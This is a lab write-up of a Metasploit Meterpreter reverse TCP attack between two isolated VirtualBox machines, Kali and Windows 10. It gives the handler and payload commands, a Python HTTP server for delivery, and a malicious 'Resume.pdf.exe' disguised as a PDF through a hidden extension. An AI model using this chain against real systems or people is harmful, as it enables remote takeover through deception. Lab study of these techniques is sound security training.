# Meterpreter-Reverse-TCP-Lab

Machines and IP Address:

Kali Linux Attacker Machine 192.168.20.11
Windows 10 Victim Machine 192.168.20.10

Lab Overview:

This lab utilizes two virtual machines running on VirtualBox: a Kali Linux Debian machine and a Windows 10 virtual machine. The objective of this lab is to demonstrate the basic usage of select Kali Linux tools, including msfvenom and Metasploit. Additionally, participants will learn about configuring networking settings for both Windows 10 and Kali Linux.

All corresponding screenshots for this lab are included in the attached file, referenced by numerical labels.

Lab:

To enable communication between the virtual machines, the network settings are configured to use an "Internal Network" with the custom name "mytest" within VirtualBox settings, as shown in Screenshot 1. This setup allows the virtual machines to have unique IP addresses while staying connected to the host's physical network. 

On the Windows 10 machine, the network settings are modified to set a static IP address. To do this, open the Network Settings, click "Change adapter options," and then modify the Ethernet properties, as shown in Screenshot 2. Similarly, on the Kali Linux machine, the IPv4 settings in "Wired Connection 1" are adjusted to set a static IP address, as shown in Screenshot 3. After configuring the IP addresses and establishing the connection, the virtual machines can communicate with each other while maintaining unique IP addresses within the host's physical network

Next, open the msfconsole and load the exploit/multi/handler module using the command "use exploit/multi/handler". This command tells Metasploit to utilize a specific exploit, with "multi" indicating the handler multi-module, which can handle various payloads for different operating systems. The "handler" part refers to the actual exploit module being loaded to interact with the payload, such as a reverse TCP Meterpreter session. By default, this command sets the payload to a generic reverse TCP shell attack. However, the goal is to use the custom payload created with Resume.pdf.exe. To achieve this, use the command "set payload windows/x64/meterpreter/reverse_tcp" (as shown in Screenshot 5). The "set" command configures the payload and prepares it for the attack. Once the payload is set, configure the LHOST by setting it to the Kali Linux IP address. Finally, type "exploit" to initiate the attack.

To proceed, a Python server will be set up to allow the Windows machine to connect to it. On the Kali Linux machine, use the command "python3 -m http.server 9999" to launch a simple HTTP server using a built-in Python module. This command creates a basic web server that listens for incoming HTTP requests and serves files from the directory where it was executed, as shown in Screenshot 6.
Next, on the Windows 10 machine, enter the URL "192.168.20.11:9999" into the browser to connect to the Python server running on the Kali machine, as demonstrated in Screenshot 7. From there, download the Resume.pdf.exe file. Notably, the file appears as "resume.pdf" in the file manager, concealing its true nature as an executable file (.exe). This is because most users do not have file extensions displayed, making it easy for users to unknowingly download malicious files. Once the file is downloaded and clicked, the user will be prompted to enter information, unknowingly granting access to the Kali machine.

To verify if a connection has been established on the Windows 10 machine, open the command prompt and use the command "netstat -anob", as shown in Screenshot 9. This command displays network statistics, including a list of network connections and listening ports, providing details such as protocol, local address, foreign address, connection state, process ID, and executable path.
On the Kali Linux machine, a connection with the handler should be established, indicating a successful exploit, as shown in Screenshot 10. Once the Meterpreter session is established, typing "shell" will grant the attacker control over the command prompt of the Windows 10 virtual machine, allowing them to execute commands remotely, as seen in Screenshot 11.

Beyond the Lab: 

This lab demonstrates a simple exploitation of an undefended Windows machine. However, in real-world scenarios, Windows Defender Firewall and other security measures would likely prevent such an attack. Moreover, experienced hackers typically develop custom exploits tailored to their target's specific vulnerabilities, allowing them to bypass existing security parameters. These tailored exploits often utilize sophisticated, spoofed tools rather than relying on prebuilt tools like those found in Kali Linux's Metasploit framework. This highlights the importance of staying vigilant and proactive in maintaining robust security measures to counter evolving threats.



